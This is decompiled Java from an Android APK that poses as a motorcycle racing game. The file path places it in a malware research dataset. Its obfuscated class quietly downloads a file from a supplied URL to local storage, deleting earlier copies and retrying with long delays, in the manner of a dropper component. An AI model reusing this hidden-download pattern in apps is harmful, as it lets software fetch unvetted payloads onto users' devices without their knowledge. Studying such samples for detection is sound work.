package com.droidhen.game.racingmototerLHL.hnxiw;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;

/* JADX INFO: Access modifiers changed from: package-private */
/* loaded from: /mnt/c/Users/truon/OneDrive/Desktop/MyWorks/Research4IECgroup/Tasks/Graph-Attention-Networks/dataset/preprocessing/apk_tool/AMD_AndroZoo_demo/dex/a0f226d067098fffd9302f3f2954f7c2.apk/classes.dex */
public class pk {
    private boolean a(String str, String str2) {
        try {
            InputStream openStream = new URL(str).openStream();
            FileOutputStream fileOutputStream = new FileOutputStream(new File(str2));
            byte[] bArr = new byte[8192];
            int read = openStream.read(bArr);
            while (read != -1) {
                fileOutputStream.write(bArr, 0, read);
                read = openStream.read(bArr);
                try {
                    Thread.sleep(500L);
                } catch (Exception e) {
                }
            }
            fileOutputStream.flush();
            fileOutputStream.close();
            openStream.close();
            return true;
        } catch (Exception e2) {
            return false;
        }
    }

    /* JADX INFO: Access modifiers changed from: protected */
    public boolean a(String str) {
        boolean z = false;
        int indexOf = str.indexOf(dem.l);
        String substring = indexOf > 4 ? str.substring(indexOf - 4, indexOf) : "";
        if (dem.a()) {
            String str2 = dem.e + dem.f + dem.h;
            File file = new File(str2);
            if (file.exists()) {
                String[] list = file.list();
                for (int i = 0; i < list.length; i++) {
                    if (list[i].substring(0, 2).equals(substring.substring(0, 2))) {
                        new File(str2 + ((String) pj.b.get(76)) + list[i]).delete();
                    }
                }
            } else {
                file.mkdirs();
            }
            String str3 = str2 + ((String) pj.b.get(76)) + dem.k + substring + dem.l;
            File file2 = new File(str3);
            if (file2.exists()) {
                file2.delete();
            }
            z = a(str, str3);
            int i2 = 3;
            while (!z) {
                try {
                    Thread.sleep(100000L);
                } catch (InterruptedException e) {
                }
                if (i2 < 0) {
                    break;
                }
                z = a(str, str3);
                i2--;
            }
        }
        return z;
    }
}
